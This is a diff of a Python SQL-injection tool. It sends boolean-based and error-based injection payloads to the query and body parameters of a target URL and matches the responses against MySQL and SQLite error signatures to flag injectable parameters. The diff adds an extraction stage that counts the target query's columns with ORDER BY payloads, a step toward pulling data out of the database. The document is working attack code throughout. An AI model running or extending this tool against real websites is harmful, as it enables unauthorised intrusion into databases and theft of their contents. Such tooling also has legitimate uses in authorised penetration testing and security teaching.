@@ -3,29 +3,8 @@ import requests
 import argparse
 import re
 
-###
-#def only_new_content(base_html: str, other_html: str) -> str:
-	# base_set = set(_to_lines(_normalize_html(base_html)))
-	# other_lines = _to_lines(_normalize_html(other_html))
-	# diff_lines = ["\033[92m" + ln + "\033[0m" if ln not in base_set else "=" for ln in other_lines]
 
-	# merged_lines = []
-	# buffer = []
-	# for line in diff_lines:
-	# 	if line == "=":
-	# 		buffer.append(line)
-	# 	else:
-	# 		if buffer:
-	# 			merged_lines.append("=".join(buffer))
-	# 			buffer = []
-	# 		merged_lines.append(line)
-	# if buffer:
-	# 	merged_lines.append("=".join(buffer))
-	# diff_lines = merged_lines
-
-	# return '\n'.join(diff_lines)
-###
-
+# ----------------------- #
 boolean_detection = {
 	"' AND '1'='1'--%20" : "' AND '1'='2'--%20",
 	"' AND '1'='2'--%20" : "' AND '1'='1'--%20",
@@ -50,7 +29,13 @@ error_patterns = {
 		"mysql_num_rows",
 		"mysql_query()",
 		"supplied argument is not a valid MySQL",
-		"Syntax error or access violation"
+		"Syntax error or access violation",
+		"Unknown column",
+		"unknown column",
+		"on line",
+		"SQL syntax",
+		"You have an error in your SQL syntax near",
+		"Unknown table"
 	],
 	"sqlite": [
 		"SQLite3::query(): Unable to prepare statement",
@@ -60,9 +45,34 @@ error_patterns = {
 		"near \"",
 		"syntax error",
 		"no such table",
-		"no such column"
+		"no such column",
+		"datatype mismatch",
+		"not authorized",
+		"misuse of aggregate"
 	]
 }
+# ----------------------- #
+
+
+# --------- PRINTS --------- #
+def print_record(record: dict, index: int | str, filter, base_content = None):
+	print(f" Record {index}:")
+	if record["infected_param"]:
+		print("  - Infected Parameter:", record["infected_param"])
+		print("  - Infected Method:", record["infected_type"])
+		print("  - Infected Payload:", record["infected_payload"])
+	print("  - Body Parameters:", record["body"])
+	print("  - Query Parameters:", record["query"])
+	print("  - Response Status Code:", record["response"]["status_code"])
+	print("  - Response Time (s):", record["response"]["time"])
+	if base_content:
+		print(f"  - Response new content:\n{filter(base_content, record['response']['content'])} \033[0m\n")
+	else:
+		print(f"  - Response new content:\n{filter(record['response']['content'])} \033[0m\n")
+	print("\n")
+# ----------------------- #
+
+
 
 # --------- INPUT PARSING --------- #
 def parse_args():
@@ -144,10 +154,10 @@ def detection_request_records(method: str, full_url: str, headers: dict, _body_s
 
 	for param in _body_params.keys():
 		body_params_copy = _body_params.copy()
-		for error_based in error_based_detection:
-			body_params_copy[param] = error_based
+		for error in error_based_detection:
+			body_params_copy[param] = error
 			detection_request_records.append(request_record(method, assemble_full_url(
-				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, "error_based", error_based))
+				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, "error_based", error))
 
 		for boolean in boolean_detection:
 			body_params_copy[param] = _body_params[param] + boolean
@@ -157,10 +167,10 @@ def detection_request_records(method: str, full_url: str, headers: dict, _body_s
 
 	for param in _query_params.keys():
 		query_params_copy = _query_params.copy()
-		for error_based in error_based_detection:
-			query_params_copy[param] = error_based
+		for error in error_based_detection:
+			query_params_copy[param] = error
 			detection_request_records.append(request_record(method, assemble_full_url(
-				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, "error_based", error_based))
+				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, "error_based", error))
 
 		for boolean in boolean_detection:
 			query_params_copy[param] = _query_params[param] + boolean
@@ -169,6 +179,7 @@ def detection_request_records(method: str, full_url: str, headers: dict, _body_s
 
 	return detection_request_records
 # ----------------------- #
+
 
 
 # --------- RECORD PARSING --------- #
@@ -198,11 +209,13 @@ def parse_detection_records(records: dict) -> list[dict]:
 # ----------------------- #
 
 
+
 # --------- ANALYSE RECORDS --------- #
 def get_boolean_record(records: list[dict], payload: str) -> dict | None:
 	for record in records:
 		if record["infected_type"] == "boolean_based" and record["infected_payload"] == payload:
 			return record
+
 	return None
 
 def get_boolean_record_pair(records: list[dict], record: dict):
@@ -211,6 +224,7 @@ def get_boolean_record_pair(records: list[dict], record: dict):
 
 def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
 	injection_points = set()
+	checked_pairs = set()
 	db_type = None
 
 	for record in records:
@@ -221,10 +235,16 @@ def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
 			elif any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns["sqlite"]):
 				injection_points.add(record["infected_param"])
 				db_type = "SQLite"
-				print("SQLite error detected")
 		elif record["infected_type"] == "boolean_based":
-			if get_boolean_record_pair(records, record)["response"]["content"] != record["response"]["content"]:
-				print("Boolean error detected")
+			pair_record = get_boolean_record_pair(records, record)
+			if not pair_record:
+				continue
+			pair_key = tuple(sorted([record["infected_payload"], pair_record["infected_payload"]]))
+			if pair_key in checked_pairs:
+				continue
+			checked_pairs.add(pair_key)
+			if pair_record["response"]["content"] != record["response"]["content"]:
+				injection_points.add(record["infected_param"])
 
 	if injection_points:
 		print(f"\n[!] Potential SQL Injection points detected ({len(injection_points)}):\n")
@@ -236,22 +256,36 @@ def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
 
 
 
-def print_record(record: dict, index: int | str, filter, base_content = None):
-	print(f" Record {index}:")
-	if record["infected_param"]:
-		print("  - Infected Parameter:", record["infected_param"])
-		print("  - Infected Method:", record["infected_type"])
-		print("  - Infected Payload:", record["infected_payload"])
-	print("  - Body Parameters:", record["body"])
-	print("  - Query Parameters:", record["query"])
-	print("  - Response Status Code:", record["response"]["status_code"])
-	print("  - Response Time (s):", record["response"]["time"])
-	if base_content:
-		print(f"  - Response new content:\n{filter(base_content, record['response']['content'])} \033[0m\n")
-	else:
-		print(f"  - Response new content:\n{filter(record['response']['content'])} \033[0m\n")
-	print("\n")
+# --------- EXTRACTION --------- #
+def get_select_size(injection_point: str, db_type: str, method, url, headers, body, default_request: dict) -> int | None:
+    original_query_params = query_params(extract_query_string(url))
+    original_body_params = body_params(body)
 
+    for i in range(1, 50):
+        payload = f"' ORDER BY {i}--%20"
+        # Query param injection
+        if injection_point in original_query_params:
+            query_params_dict = original_query_params.copy()
+            query_params_dict[injection_point] += payload
+            full_url = assemble_full_url(extract_base_url(url), query_string(query_params_dict))
+            record = request_record(method, full_url, headers, body, injection_point, "extraction", payload)
+            if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
+                return i - 1
+        # Body param injection
+        elif injection_point in original_body_params:
+            body_params_dict = original_body_params.copy()
+            body_params_dict[injection_point] += payload
+            body_string_modified = body_string(body_params_dict)
+            record = request_record(method, url, headers, body_string_modified, injection_point, "extraction", payload)
+            if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
+                return i - 1
+
+    return None
+# ----------------------- #
+
+
+
+# --------- MAIN --------- #
 def main():
 	method, url, headers, body = parse_args()
 
@@ -269,8 +303,21 @@ def main():
 		print("Injection Points:", injection_points)
 		print("Database Type:", db_type)
 
+		for injection_point in injection_points:
+			if not db_type:
+				print(f"[!] Cannot proceed with extraction for parameter '{injection_point}' as the database type is unknown.")
+				continue
+
+			print(f"[+] Attempting to determine the number of columns for injection point '{injection_point}'...")
+			num_columns = get_select_size(injection_point, db_type, method, url, headers, body, records["default"])
+			if num_columns:
+				print(f"[+] Number of columns determined: {num_columns}\n")
+			else:
+				print(f"[-] Could not determine the number of columns for injection point '{injection_point}'.\n")
+
 	except requests.RequestException as e:
 		print("[!] An error occurred while making the requests:", e)
 
 if __name__ == "__main__":
 	main()
+# ----------------------- #
